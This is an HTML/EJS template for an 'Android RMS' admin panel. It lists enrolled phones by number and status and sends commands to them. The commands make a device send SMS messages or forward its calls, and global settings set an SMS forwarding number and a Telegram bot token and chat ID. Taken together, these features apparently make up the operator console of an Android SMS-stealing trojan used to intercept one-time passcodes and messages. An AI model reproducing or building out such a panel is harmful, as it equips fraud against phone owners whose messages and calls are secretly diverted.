<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - RMS</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1, h2 { color: #1c1e21; border-bottom: 2px solid #f0f2f5; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; border: 1px solid #ddd; text-align: left; font-size: 14px; }
        th { background-color: #f5f6f7; }
        .status-online { color: #31a24c; font-weight: bold; }
        .status-offline { color: #8a8d91; }
        .form-section { background: #f5f6f7; padding: 20px; border-radius: 8px; margin-top: 30px; }
        .form-section h2 { margin-top: 0; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; }
        input[type="text"], input[type="number"], select, textarea { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { background-color: #1877f2; color: white; padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; }
        button:hover { background-color: #166fe5; }
        .delete-btn { background-color: #fa3e3e; }
        .delete-btn:hover { background-color: #e03030; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üì± Android RMS - Admin Panel</h1>
        <h2>Registered Devices</h2>
        <table>
            <thead>
                <tr><th>Status</th><th>Device Name</th><th>Device ID</th><th>OS</th><th>Phone</th><th>Battery</th><th>Actions</th></tr>
            </thead>
            <tbody>
                <% if (devices.length > 0) { devices.forEach(device => { %>
                    <tr>
                        <td><span class="<%= device.is_online ? 'status-online' : 'status-offline' %>">‚óè <%= device.is_online ? 'Online' : 'Offline' %></span></td>
                        <td><%= device.device_name %></td>
                        <td><small><%= device.device_id %></small></td>
                        <td><%= device.os_version %></td>
                        <td><%= device.phone_number %></td>
                        <td><%= device.battery_level %>%</td>
                        <td>
                            <form action="/delete-device/<%= device.device_id %>" method="POST" onsubmit="return confirm('Delete this device?');">
                                <button type="submit" class="delete-btn">Delete</button>
                            </form>
                        </td>
                    </tr>
                <% }) } else { %>
                    <tr><td colspan="7" style="text-align: center;">No devices registered yet.</td></tr>
                <% } %>
            </tbody>
        </table>
        <div class="form-section">
            <h2>Send Command</h2>
            <form id="commandForm">
                <div class="form-group"><label for="device_id">Select Device</label><select id="device_id" required><option value="">-- Select --</option><% devices.forEach(device => { %><option value="<%= device.device_id %>"><%= device.device_name %></option><% }) %></select></div>
                <div class="form-group"><label for="command_type">Command Type</label><select id="command_type"><option value="send_sms">Send SMS</option><option value="call_forward">Call Forward</option></select></div>
                <div id="smsFields">
                    <div class="form-group"><label for="phone_number">Phone Number</label><input type="text" id="phone_number" placeholder="+91..."></div>
                    <div class="form-group"><label for="message">Message</label><textarea id="message" rows="3"></textarea></div>
                </div>
                <div id="callForwardFields" style="display: none;">
                    <div class="form-group"><label for="cf_action">Action</label><select id="cf_action"><option value="enable">Enable</option><option value="disable">Disable</option></select></div>
                    <div class="form-group"><label for="cf_number">Forward To Number</label><input type="text" id="cf_number" placeholder="+91..."></div>
                </div>
                <div class="form-group"><label for="sim_slot">SIM Slot</label><select id="sim_slot"><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
                <button type="submit">Send Command</button><p id="commandStatus" style="margin-top: 15px; font-weight: bold;"></p>
            </form>
        </div>
        <div class="form-section">
            <h2>Global Settings</h2>
            <form id="settingsForm">
                <div class="form-group"><label for="sms_forward_number">SMS Forwarding Number</label><input type="text" id="sms_forward_number" value="<%= settings.sms_forward_number || '' %>"></div>
                <div class="form-group"><label for="telegram_bot_token">Telegram Bot Token</label><input type="text" id="telegram_bot_token" value="<%= settings.telegram_bot_token || '' %>"></div>
                <div class="form-group"><label for="telegram_chat_id">Telegram Chat ID</label><input type="text" id="telegram_chat_id" value="<%= settings.telegram_chat_id || '' %>"></div>
                <button type="submit">Save Settings</button><p id="settingsStatus" style="margin-top: 15px; font-weight: bold;"></p>
            </form>
        </div>
    </div>
    <script>
        setTimeout(() => window.location.reload(), 30000);
        const commandTypeSelect = document.getElementById('command_type'), smsFields = document.getElementById('smsFields'), callForwardFields = document.getElementById('callForwardFields');
        commandTypeSelect.addEventListener('change', () => {
            smsFields.style.display = commandTypeSelect.value === 'send_sms' ? 'block' : 'none';
            callForwardFields.style.display = commandTypeSelect.value === 'call_forward' ? 'block' : 'none';
        });
        document.getElementById('commandForm').addEventListener('submit', async e => {
            e.preventDefault();
            const form = e.target, statusEl = document.getElementById('commandStatus');
            statusEl.textContent = 'Sending...';
            const body = {
                device_id: form.querySelector('#device_id').value,
                command_type: form.querySelector('#command_type').value,
                command_data: form.querySelector('#command_type').value === 'send_sms' ? { phone_number: form.querySelector('#phone_number').value, message: form.querySelector('#message').value, sim_slot: parseInt(form.querySelector('#sim_slot').value) } : { action: form.querySelector('#cf_action').value, forward_number: form.querySelector('#cf_number').value, sim_slot: parseInt(form.querySelector('#sim_slot').value) }
            };
            const res = await fetch('/api/command/send', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
            statusEl.textContent = res.ok ? 'Command sent successfully!' : 'Error sending command.';
            statusEl.style.color = res.ok ? 'green' : 'red';
        });
        document.getElementById('settingsForm').addEventListener('submit', async e => {
            e.preventDefault();
            const form = e.target, statusEl = document.getElementById('settingsStatus');
            statusEl.textContent = 'Saving...';
            const [smsRes, tgRes] = await Promise.all([
                fetch('/api/config/sms_forward', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ forward_number: form.querySelector('#sms_forward_number').value }) }),
                fetch('/api/config/telegram', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ telegram_bot_token: form.querySelector('#telegram_bot_token').value, telegram_chat_id: form.querySelector('#telegram_chat_id').value }) })
            ]);
            statusEl.textContent = smsRes.ok && tgRes.ok ? 'Settings saved successfully!' : 'Error saving settings.';
            statusEl.style.color = smsRes.ok && tgRes.ok ? 'green' : 'red';
        });
    </script>
</body>
</html>
